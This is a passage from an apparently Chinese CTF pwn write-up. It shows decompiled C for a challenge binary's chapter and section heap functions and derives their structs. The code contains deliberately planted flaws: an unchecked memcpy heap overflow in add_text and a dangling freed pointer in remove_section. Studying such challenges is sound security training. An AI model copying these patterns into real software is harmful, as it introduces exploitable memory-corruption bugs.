class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">11</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x30uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%p"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nSection name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">40LL</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v7<span class="token punctuation">;</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNot enough space"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nChapter not found!"</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v7<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>add_section()接收的参数也为book_chunk，实际上，八个功能接收的参数都为book_chunk。函数首先要求输入chaptername，然后进入for循环，一共有两个for循环，第一个for循环遍历book_chunk，然后依次对比每个chaptername和我们输入的chaptername是否一致，如果一致则进入下一层循环，<strong>v1 = *(a1 + 8 * (i + 4LL))</strong>，v1则被赋值为对应的chapterchunk指针。</p><p>进入下一层循环后，已久会用上一层循环的判断方式，<strong><em>(\</em>(a1 + 8 * (i + 4LL)) + 8 * (j + 4LL))</strong>,我们来分析一下这一串指针的意思，第一部分<strong>*(a1 + 8 * (i + 4LL))</strong>，这其实就是v1，原式可以化简为<strong>*(v1 + 8 * (j + 4LL))</strong>，v1指向chapterchunk，所以<strong>*(v1 + 8 * (j + 4LL))</strong>的最小值为<strong>*(v1 +0x20)</strong>。如果<strong>*(v1 + 8 * (j + 4LL))</strong>没有值，那么分配一个0x30的chunk，将指针存入其中，所以我们也能写出chapter的结构体，如下</p><pre><code>struct chapter{    char name[32];    char* section[10];}</code></pre><p>然后打印出我们申请的sectionchunk的地址，往sectionchunk读入数据，并将sectionchunk+40的位置写入32。</p><h4 id="3-add-text"><a href="#3-add-text" class="headerlink" title="3.add_text()"></a>3.add_text()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">add_text</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rsi</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>  size_t v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+14h] [rbp-14Ch]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-148h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-144h]</span>  <span class="token keyword">char</span> s2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-140h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+40h] [rbp-120h]</span>  <span class="token keyword">unsigned</span> __int64 v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+148h] [rbp-18h]</span>  v10 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nWhich section do you want to add into:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>off_18 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s2<span class="token punctuation">,</span> <span class="token number">30LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>LABEL_12<span class="token punctuation">:</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">></span> <span class="token number">9</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token operator">++</span>v5<span class="token punctuation">;</span>        <span class="token keyword">goto</span> LABEL_12<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          v1 <span class="token operator">=</span> <span class="token operator">&amp;</span>s2<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s2<span class="token punctuation">)</span> <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nHow many chapters you want to write:"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span>    v7 <span class="token operator">=</span> <span class="token function">input_size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token number">256</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nText:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">256LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nToo many"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nSection not found!"</span><span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v10<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这个程序通过我们输入的sectionname来定位sectionchunk，和上一个功能的定位方式一样。</p><p>定位了section之后，首先输入textsize，然后分配一个textsize大小的chunk，并将指针存入sectionchunk+32的位置处，接着往t栈中的一个变量s写入数据，然后将写入s的数据复制到textchunk，同样我们也能写出section的结构体，如下</p><pre><code>struct section{    char name[32];    char* text;}</code></pre><h4 id="4-remove-text"><a href="#4-remove-text" class="headerlink" title="4.remove_text()"></a>4.remove_text()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">remove_text</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-118h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-114h]</span>  <span class="token keyword">char</span> s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-110h]</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+128h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nSection name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token number">255LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>remove_text,通过sectionname定位sectionchunk，然后free掉该sectionchunk中的textchunk指针指向的chunk，然后将指针清零</p><h4 id="5-remove-section"><a href="#5-remove-section" class="headerlink" title="5.remove_section()"></a>5.remove_section()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">remove_section</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-118h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-114h]</span>  <span class="token keyword">char</span> s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-110h]</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+128h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nSection name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">input</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token number">255LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">4LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这个同样是先输入sectionname，定位到sectionchunk，然后先判断textchunk指针是否存在，存在的话就将textchunk free掉并将指针清零，然后free掉sectionchunk</p><h4 id="6-remove-chapter"><a href="#6-remove-chapter" class="headerlink" title="6.remove_chapter()"></a>6.remove_chapter()</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">remove_chapter</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-118h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-114h]</span>  <span class="token 